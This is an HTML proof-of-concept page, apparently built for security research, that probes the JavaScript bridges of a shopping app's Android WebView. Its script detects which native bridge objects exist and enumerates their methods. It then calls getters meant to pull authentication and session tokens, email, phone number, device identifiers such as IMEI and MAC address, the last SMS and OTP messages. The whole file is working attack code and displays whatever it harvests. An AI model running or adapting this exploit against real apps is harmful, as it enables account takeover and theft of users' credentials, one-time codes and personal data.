<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FK1 PoC</title>
<style>
  body { background:#111; color:#0f0; font-family:monospace; font-size:13px; padding:12px; }
  h1   { color:#f00; font-size:14px; margin-bottom:8px; }
  .ok  { color:#0f0; }
  .bad { color:#f66; }
  .hit { color:#f00; font-weight:bold; }
  .key { color:#ff0; }
  .val { color:#0ff; word-break:break-all; }
  div  { margin-bottom:4px; }
</style>
</head>
<body>
<h1>&#x26a0; FK1 — UltraWebView Bridge PoC</h1>
<div id="out"></div>

<script>
var out = document.getElementById('out');

function log(html) {
  var d = document.createElement('div');
  d.innerHTML = html;
  out.appendChild(d);
}

function probe(objName, method) {
  try {
    var obj = window[objName];
    if (!obj) return;
    var fn = obj[method];
    if (typeof fn !== 'function') return;
    var r = fn.call(obj);
    if (r !== undefined && r !== null && r !== '') {
      var s = String(r).substring(0, 500);
      log('<span class="hit">&#x2757; ' + objName + '.' + method + '()</span><br>'
        + '<span class="val">' + s + '</span>');
    }
  } catch(e) {
    log('<span class="bad">' + objName + '.' + method + ' → ' + e.message + '</span>');
  }
}

// Step 1: check which known bridges exist
log('<span class="key">--- STEP 1: Bridge detection ---</span>');

var BRIDGES = [
  'JSSMSModule','JSAuthModule','JSDeviceInfoModule','JSContactModule',
  'JSAccountModule','JSUserModule','JSFlipkartModule','JSUltraModule',
  'JSPaymentModule','JSLocationModule','JSPermissionModule','JSStorageModule',
  'JSNavigationModule','JSNotificationModule','AndroidBridge','NativeBridge',
  'flipkartAndroid','fkAndroid','FKAndroid','JSInterface','JSBridge','UltraBridge'
];

var found = [];
for (var i = 0; i < BRIDGES.length; i++) {
  var name = BRIDGES[i];
  try {
    if (window[name] !== undefined && window[name] !== null) {
      found.push(name);
      log('<span class="ok">&#x2705; window.' + name + ' EXISTS</span>');
    }
  } catch(e) {}
}

if (found.length === 0) {
  log('<span class="bad">&#x274c; No bridges found. Bridges not injected for this URL.</span>');
} else {
  log('<span class="ok">Total found: ' + found.length + '</span>');
}

// Step 2: enumerate methods on each found bridge
log('<span class="key">--- STEP 2: Method enumeration ---</span>');
for (var fi = 0; fi < found.length; fi++) {
  var bname = found[fi];
  var obj = window[bname];
  var methods = [];
  try {
    for (var k in obj) {
      if (typeof obj[k] === 'function') methods.push(k);
    }
  } catch(e) {}
  try {
    var proto = Object.getPrototypeOf(obj);
    if (proto) {
      var pnames = Object.getOwnPropertyNames(proto);
      for (var pi = 0; pi < pnames.length; pi++) {
        if (methods.indexOf(pnames[pi]) === -1 && pnames[pi] !== 'constructor') {
          methods.push(pnames[pi]);
        }
      }
    }
  } catch(e) {}
  log('<span class="key">' + bname + ':</span> ' + (methods.length ? methods.join(', ') : '[no enumerable methods]'));
}

// Step 3: call targeted methods
log('<span class="key">--- STEP 3: Data extraction ---</span>');

// Auth
probe('JSAuthModule','getAuthToken');
probe('JSAuthModule','getAccessToken');
probe('JSAuthModule','getSessionToken');
probe('JSAuthModule','getUserInfo');
probe('JSAuthModule','getUser');
probe('JSAuthModule','getUserId');
probe('JSAuthModule','getEmail');
probe('JSAuthModule','getMobile');

// Account / User
probe('JSAccountModule','getUserProfile');
probe('JSAccountModule','getProfile');
probe('JSAccountModule','getEmail');
probe('JSAccountModule','getMobile');
probe('JSAccountModule','getPhone');
probe('JSAccountModule','getUserId');
probe('JSUserModule','getUserProfile');
probe('JSUserModule','getProfile');
probe('JSUserModule','getEmail');
probe('JSUserModule','getMobile');
probe('JSFlipkartModule','getUserInfo');
probe('JSFlipkartModule','getAuthToken');

// Device
probe('JSDeviceInfoModule','getDeviceId');
probe('JSDeviceInfoModule','getAndroidId');
probe('JSDeviceInfoModule','getIMEI');
probe('JSDeviceInfoModule','getDeviceInfo');
probe('JSDeviceInfoModule','getIPAddress');
probe('JSDeviceInfoModule','getMacAddress');

// SMS
probe('JSSMSModule','getLastSms');
probe('JSSMSModule','captureOtpMessage');
probe('JSSMSModule','startSmsRetriever');

// Generic zero-arg probe on every found bridge
log('<span class="key">--- STEP 4: Generic probe ---</span>');
for (var gi = 0; gi < found.length; gi++) {
  var gname = found[gi];
  var gobj = window[gname];
  var gmethods = [];
  try {
    var gproto = Object.getPrototypeOf(gobj);
    if (gproto) {
      gmethods = Object.getOwnPropertyNames(gproto).filter(function(k){ return k !== 'constructor'; });
    }
  } catch(e) {}
  for (var gmi = 0; gmi < gmethods.length; gmi++) {
    probe(gname, gmethods[gmi]);
  }
}

log('<span class="ok">&#x2714; Scan complete.</span>');
</script>
</body>
</html>
